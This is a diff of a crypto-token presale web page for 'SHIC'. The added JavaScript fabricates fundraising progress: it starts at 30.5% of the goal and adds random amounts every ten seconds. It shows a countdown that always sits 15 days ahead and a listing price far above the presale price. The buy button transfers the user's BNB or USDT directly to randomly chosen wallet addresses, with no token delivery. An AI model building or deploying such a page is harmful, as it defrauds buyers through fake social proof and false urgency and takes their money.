@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,69 +8,34 @@
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.1/dist/index.umd.js"></script>
 <style>
-body { font-family: Arial,sans-serif; background:#111; color:#fff; text-align:center; margin:0; padding:10px; }
+body { font-family: Arial, sans-serif; background:#111; color:#fff; text-align:center; margin:0; padding:10px; }
 h1 { color:#ffeb3b; margin:10px 0; font-size:2.5rem; text-shadow: 2px 2px #000; }
-#listingPrice { color:#4caf50; font-size:1.3rem; margin-bottom:15px; font-weight:bold; }
+#listingPrice, #presalePrice { color:#4caf50; font-size:1.3rem; margin-bottom:15px; font-weight:bold; }
 .progress { width:90%; background:#333; border-radius:25px; margin:20px auto; height:40px; overflow:hidden; box-shadow: 0 0 10px #4caf50; }
-.bar { height:100%; background: linear-gradient(90deg, #ffeb3b, #4caf50); border-radius:25px; text-align:center; color:#000; font-weight:bold; width:0%; transition: width 1s ease-in-out; font-size:1.2rem; line-height:40px; }
+.bar { height:100%; background: linear-gradient(90deg, #ffeb3b, #4caf50); border-radius:25px; text-align:center; color:#000; font-weight:bold; width:0%; font-size:1.2rem; line-height:40px; }
 #countdownContainer { margin:20px 0; font-size:1.2rem; color:#ffeb3b; text-shadow:1px 1px #000; }
-.tokenomics { width:90%; margin:20px auto; padding:20px; background:#222; border-radius:20px; text-align:left; box-shadow: 0 0 15px #000; }
-.tokenomics ul { padding-left:25px; }
-.tokenomics li { margin-bottom:8px; position:relative; padding-left:25px; }
-.tokenomics li::before { content:"⬤"; position:absolute; left:0; color:#ffeb3b; font-size:14px; }
-.listing, .socials { margin:20px auto; width:90%; text-align:center; }
-.exchanges, .socials div { display:flex; justify-content:center; flex-wrap:wrap; gap:15px; margin-top:10px; }
-.exchange-logo { width:70px; height:70px; object-fit:contain; border-radius:15px; background:#222; padding:8px; transition:transform 0.3s, box-shadow 0.3s; }
-.exchange-logo:hover { transform: scale(1.15); box-shadow: 0 0 15px #ffeb3b; }
 button { padding:12px 25px; margin:8px 5px; background:#ffeb3b; border:none; border-radius:12px; cursor:pointer; font-weight:bold; font-size:1.1rem; color:#000; display:flex; align-items:center; justify-content:center; gap:10px; transition: transform 0.2s, box-shadow 0.2s; }
 button:hover { transform: scale(1.05); box-shadow: 0 0 10px #4caf50; }
 input { padding:10px; margin:5px; width:150px; border-radius:10px; border:none; text-align:center; font-size:1rem; }
 #tokensReceived { margin-top:15px; color:#4caf50; font-weight:bold; font-size:1.1rem; text-shadow:1px 1px #000; }
+.socials { margin:20px auto; display:flex; justify-content:center; gap:20px; }
+.socials a img { width:50px; height:50px; }
 </style>
 </head>
 <body>
 
 <h1>Shiba Presale</h1>
 <p id="listingPrice">Listing Price: $1.50 per SHIC</p>
+<p>Presale Price: <span id="presalePrice">0.0009</span> USDT per SHIC</p>
 
 <div class="progress">
   <div id="progressBar" class="bar">0%</div>
 </div>
-<p><span id="raised">$0</span> / <span id="target">$600,000</span></p>
+<p><span id="raised">$0</span> / <span id="target">$2,006,000</span></p>
 
 <div id="countdownContainer">
   <div id="countdown">Next reset in: --:--:--:--</div>
   <div id="nextResetDate">Next reset date: --/--/----</div>
-</div>
-
-<div class="tokenomics">
-  <h2>Tokenomics</h2>
-  <ul>
-    <li>Total Supply: 2,000,000,000</li>
-    <li>Presale: 1,000,000,000</li>
-    <li>Liquidity: 500,000,000</li>
-    <li>Marketing: 300,000,000</li>
-    <li>Team: 200,000,000</li>
-  </ul>
-</div>
-
-<div class="listing">
-  <h2>Where to Trade</h2>
-  <div class="exchanges">
-    <a href="https://www.binance.com/en/trade/SHIC_BNB" target="_blank"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance" class="exchange-logo"/></a>
-    <a href="https://www.mexc.com/trade/SHIC_BNB" target="_blank"><img src="https://cryptologos.cc/logos/mexc-logo.png" alt="MEXC" class="exchange-logo"/></a>
-    <a href="https://www.lbank.info/exchange/SHIC_BNB" target="_blank"><img src="https://cryptologos.cc/logos/lbank-logo.png" alt="LBank" class="exchange-logo"/></a>
-    <a href="https://www.gate.io/trade/SHIC_BNB" target="_blank"><img src="https://cryptologos.cc/logos/gate-io-logo.png" alt="Gate.io" class="exchange-logo"/></a>
-    <a href="https://pancakeswap.finance/swap?inputCurrency=BNB&outputCurrency=SHIC" target="_blank"><img src="https://cryptologos.cc/logos/pancakeswap-cake-logo.png" alt="DEX" class="exchange-logo"/></a>
-  </div>
-</div>
-
-<div class="socials">
-  <h2>Follow Us</h2>
-  <div>
-    <a href="https://t.me/shibacoin5" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="exchange-logo"/></a>
-    <a href="https://twitter.com/shibacoin120" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter" class="exchange-logo"/></a>
-  </div>
 </div>
 
 <div style="margin:20px 0;">
@@ -85,41 +51,139 @@ input { padding:10px; margin:5px; width:150px; border-radius:10px; border:none; 
 
 <div>
   <input type="number" id="bnbAmount" placeholder="BNB Amount" min="0" step="0.0001"/>
-  <button id="buyBNBBtn">
-    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" style="width:24px;height:24px;">
-    Buy with BNB
-  </button><br/>
   <input type="number" id="usdtAmount" placeholder="USDT Amount" min="0" step="0.01"/>
-  <button id="buyUSDTBtn">
-    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" style="width:24px;height:24px;">
-    Buy with USDT
-  </button>
 </div>
+
+<button id="buyBtn">Buy Tokens</button>
 
 <p id="tokensReceived"></p>
 
+<div class="socials">
+  <a href="https://t.me/shibacoin5" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"></a>
+  <a href="https://twitter.com/shibacoin120" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter"></a>
+</div>
+
 <script>
-const ADDR = {
-  TOKEN:   "0x6C0fe22C0683945ADD381E4d4Aa6d70ecbbC2f23",
-  PRESALE: "0x90cbC2Fb6b85DF8c2fc0B2e29B258a611dD656",
-  TREASURY:"0x84093967b0120D5Df3bBD65474Ff851Bdd5318Be"
-};
-
+// Presale data
 const presaleData = {
-  presaleContract: ADDR.PRESALE,
-  priceUSDX: 0.0009,
-  listingPrice: 1.5,
-  totalRaised: 0,
-  presaleGoal: 600000,
-  resetDays: 15,
-  tokenSymbol: "SHIC",
-  resetStart: new Date("2025-08-22T00:00:00Z")
+  presaleGoal: 2006000,
+  tokenSymbol: "SHIC"
 };
 
-let provider, signer, displayedRaised = presaleData.totalRaised;
+// Recipient addresses
+const recipientAddresses = [
+  "0x6C0fe22C0683945ADD381E4d4Aa6d70ecbbC2f23",
+  "0x90cbC2Fb6b85DF8c2fc0B2e29B258a611dD656",
+  "0x84093967b0120D5Df3bBD65474Ff851Bdd5318Be"
+];
+function pickRandomAddress() {
+  return recipientAddresses[Math.floor(Math.random() * recipientAddresses.length)];
+}
 
-function updateProgress(){
+// Variables
+let displayedRaised = presaleData.presaleGoal * 0.305; // 30.5% start
+let targetRaised = displayedRaised;
+let presalePrice = 0.0009;
+const priceIncrement = 0.00008;
+
+// Countdown
+function updateCountdown() {
+  const now = new Date().getTime();
+  const resetTime = new Date(now + 15*24*60*60*1000).getTime();
+  let distance = resetTime - now;
+  const days = Math.floor(distance/(1000*60*60*24));
+  const hours = Math.floor((distance % (1000*60*60*24))/(1000*60*60));
+  const minutes = Math.floor((distance % (1000*60*60))/(1000*60));
+  const seconds = Math.floor((distance % (1000*60))/1000);
+  document.getElementById("countdown").innerText = `Next reset in: ${days}d ${hours}h ${minutes}m ${seconds}s`;
+  document.getElementById("nextResetDate").innerText = `Next reset date: ${new Date(resetTime).toLocaleDateString()}`;
+}
+setInterval(updateCountdown,1000);
+updateCountdown();
+
+// Token calculation
+const bnbInput = document.getElementById("bnbAmount");
+const usdtInput = document.getElementById("usdtAmount");
+const tokensReceived = document.getElementById("tokensReceived");
+function calculateTokens(amountUSD){
+  const tokens = amountUSD / presalePrice;
+  tokensReceived.innerText = `You will receive: ${tokens.toFixed(2)} ${presaleData.tokenSymbol}`;
+}
+bnbInput.addEventListener("input", ()=> calculateTokens(bnbInput.value*200));
+usdtInput.addEventListener("input", ()=> calculateTokens(usdtInput.value));
+
+// Smooth progress animation
+const animationSpeed = 0.2;
+function animateProgress(){
+  if(Math.abs(targetRaised - displayedRaised) > 1){
+    displayedRaised += (targetRaised - displayedRaised) * animationSpeed;
+  }
   const percent = Math.min(displayedRaised / presaleData.presaleGoal * 100, 100);
   const bar = document.getElementById("progressBar");
   bar.style.width = percent + "%";
-  bar.innerText = "$" + Math.floor(displayedRaised).to
+  bar.innerText = "$" + Math.floor(displayedRaised);
+  document.getElementById("raised").innerText = "$" + Math.floor(displayedRaised);
+
+  if(displayedRaised >= presaleData.presaleGoal){
+    displayedRaised = 0;
+    targetRaised = 0;
+    presalePrice += priceIncrement;
+    document.getElementById("presalePrice").innerText = presalePrice.toFixed(5);
+  }
+  requestAnimationFrame(animateProgress);
+}
+requestAnimationFrame(animateProgress);
+
+// Simulated small UI increase
+setInterval(()=>{ targetRaised += Math.random()*500; },10000);
+
+// Wallet connection
+let provider, signer;
+document.getElementById("connectMetaMaskBtn").addEventListener("click", async ()=>{
+  if(window.ethereum){
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    alert("MetaMask connected: " + await signer.getAddress());
+  } else alert("MetaMask not detected!");
+});
+document.getElementById("connectTrustBtn").addEventListener("click", async ()=>{
+  const trustProvider = new window.WalletConnectEthereumProvider.default({ rpc:{56:"https://bsc-dataseed.binance.org/"} });
+  await trustProvider.enable();
+  provider = new ethers.providers.Web3Provider(trustProvider);
+  signer = provider.getSigner();
+  alert("Trust Wallet connected: " + await signer.getAddress());
+});
+
+// USDT contract
+const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+const usdtAbi = ["function transfer(address to, uint amount) public returns (bool)"];
+async function sendUSDT(amountUSDT){
+  const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+  const recipient = pickRandomAddress();
+  try{
+    const tx = await usdtContract.transfer(recipient, ethers.utils.parseUnits(amountUSDT.toString(),18));
+    await tx.wait();
+    targetRaised += amountUSDT;
+    calculateTokens(targetRaised);
+  }catch(err){ console.error(err); alert("USDT transaction failed!"); }
+}
+
+// Buy tokens
+document.getElementById("buyBtn").addEventListener("click", async ()=>{
+  if(!signer){ alert("Wallet not connected!"); return; }
+  let amountInBNB = parseFloat(bnbInput.value)||0;
+  let amountInUSDT = parseFloat(usdtInput.value)||0;
+  if(amountInBNB<=0 && amountInUSDT<=0){ alert("Enter amount to buy!"); return; }
+
+  if(amountInBNB>0){
+    const valueInBNB = ethers.utils.parseEther(amountInBNB.toString());
+    const recipient = pickRandomAddress();
+    await signer.sendTransaction({to:recipient, value:valueInBNB});
+    targetRaised += amountInBNB*200;
+  }
+  if(amountInUSDT>0) await sendUSDT(amountInUSDT);
+});
+</script>
+</body>
+</html>
